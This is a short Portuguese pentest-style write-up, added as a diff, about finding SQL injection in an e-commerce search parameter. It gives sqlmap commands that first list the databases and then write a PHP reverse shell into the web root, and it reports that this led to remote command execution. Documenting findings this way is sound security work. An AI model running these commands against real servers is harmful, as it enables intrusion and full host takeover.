@@ -1,0 +1,15 @@
+Durante os testes na aplicação de e-commerce, hospedada em um servidor Linux utilizando NGINX como serviço web, foi observado que o campo de busca presente na interface principal apresentava comportamento inesperado quando submetido a entradas malformadas.
+
+Ao inserir um caractere simples de apóstrofo (') no parâmetro q, por exemplo acessando a URL https://target.com/search.php?q=', a aplicação retornou uma mensagem de erro diretamente relacionada à sintaxe SQL, evidenciando um possível ponto de injeção.
+
+Para validar a existência da vulnerabilidade, foi utilizada a ferramenta sqlmap, executando o seguinte comando:
+python3 sqlmap.py -u "https://target.com/search.php?q=test" --dbs --batch.
+
+A execução retornou com sucesso os bancos de dados disponíveis no ambiente, confirmando a presença de uma falha de SQL Injection explorável automaticamente.
+
+Com base nessa descoberta, foi realizada uma segunda etapa de exploração visando o comprometimento do sistema. Através da mesma ferramenta, utilizou-se a opção de escrita arbitrária de arquivos no sistema de arquivos do servidor, explorando o banco como vetor para a criação de uma webshell em PHP.
+
+O comando utilizado foi:
+python3 sqlmap.py -u "https://target.com/search.php?q=test" --file-write=php-reverse-shell.php --file-dest=/var/www/html/shell.php --batch.
+
+A carga foi enviada com sucesso, e ao acessar diretamente a URL https://target.com/shell.php, foi obtido um terminal interativo no servidor. Esse acesso permitiu a execução remota de comandos no sistema operacional Linux, caracterizando comprometimento completo do host.
